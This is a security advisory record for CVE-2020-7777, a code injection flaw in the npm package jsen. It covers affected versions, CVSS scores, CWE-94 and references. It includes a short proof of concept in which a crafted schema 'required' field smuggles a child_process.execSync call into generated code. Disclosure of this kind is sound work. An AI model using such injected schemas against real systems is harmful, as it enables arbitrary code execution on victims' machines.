advisory_id: GHSA-vm64-cfqx-3698
datasource_id: github_osv_importer_v2/GHSA-vm64-cfqx-3698
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/02/GHSA-vm64-cfqx-3698/GHSA-vm64-cfqx-3698.json
aliases:
  - CVE-2020-7777
summary: |
  Code Injection in jsen
  This affects all versions of package jsen. If an attacker can control the schema file, it could run arbitrary JavaScript code on the victim machine. In the module description and README file there is no mention about the risks of untrusted schema files, so it is assumed that this is applicable. In particular the required field of the schema is not properly sanitized. The resulting string that is build based on the schema definition is then passed to a `Function.apply();`, leading to an Arbitrary Code Execution.

  ### PoC
  ```js
  const jsen = require('jsen');
  let schema = JSON.parse(
  { &quot;type&quot;: &quot;object&quot;, &quot;properties&quot;: { &quot;username&quot;: { &quot;type&quot;: &quot;string&quot; } }, &quot;required&quot;: [&quot;\\&quot;+process.mainModule.require(\&#39;child_process\&#39;).execSync(\&#39;touch malicious\&#39;)+\\&quot;&quot;] }
  );

  const validate = jsen(schema); validate({});
  ```
impacted_packages:
  - purl: pkg:npm/jsen
    affected_versions: vers:npm/<=0.6.6
    fixed_versions:
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.2'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/02/GHSA-vm64-cfqx-3698/GHSA-vm64-cfqx-3698.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-94
references:
  - url: https://github.com/bugventure/jsen/blob/master/lib/jsen.js#L875
    reference_type:
    reference_id:
  - url: https://security.snyk.io/vuln/SNYK-JS-JSEN-1014670
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2020-7777
    reference_type:
    reference_id: CVE-2020-7777
